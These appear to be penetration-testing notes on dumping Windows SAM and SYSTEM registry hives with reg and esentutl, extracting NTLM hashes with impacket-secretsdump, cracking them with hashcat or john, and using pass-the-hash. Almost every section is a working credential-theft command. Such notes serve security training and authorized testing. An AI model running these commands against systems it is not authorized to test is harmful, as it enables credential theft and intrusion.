# Dump Registry Hives

## 1. Dump Registry Hives

- Using `reg`

    Run the following command as Administrator/SYSTEM privileges that has the `SeBackupPrivilege`:

    ```powershell
    reg save HKLM\SAM .\sam.bak
    reg save HKLM\SYSTEM .\system.bak
    ```

- Using `esentutl`

    Alternatively, we can dump them using `esentutil` even if we don't have the `SeBackupPrivilege`:

    ```powershell
    # /y: Copy a file
    # /vss: Use Volume Shadow Copy (VSS)
    # /d: The destination path
    esentutl /y /vss C:\Windows\System32\config\SAM /d .\sam.save
    esentutl /y /vss C:\Windows\System32\config\SYSTEM /d .\system.save
    ```

## 2. Dump Password Hashes from Hives

After that, we can dump password hashes from these hives:

```sh
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## 3. (Option 1) Crack the Hashes

To crack the hashes, we need to extract the NT hash from the NTLM hashes. For example, assume we got the hash below:

```txt
Administrator:500:abcdefghi...:zyxwvuts...:::
```

We use the NT part (`zyxwvuts...`) for cracking:

```sh
echo -n "zyxwvuts..." > hash.txt
```

Now use `hashcat` or `john` to crack it:

```sh
hashcat -m 1000 hash.txt wordlist.txt
# or
john --format=nt --wordlist=wordlist.txt hash.txt
```

## 3. (Option 2) Pass-The-Hash

Even if the hash cannot be cracked, it may be possible to log into the target machine using NTLM or the NT hash.

## Resources

- [Dumping SAM via Esentutl.exe by Red Team Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe)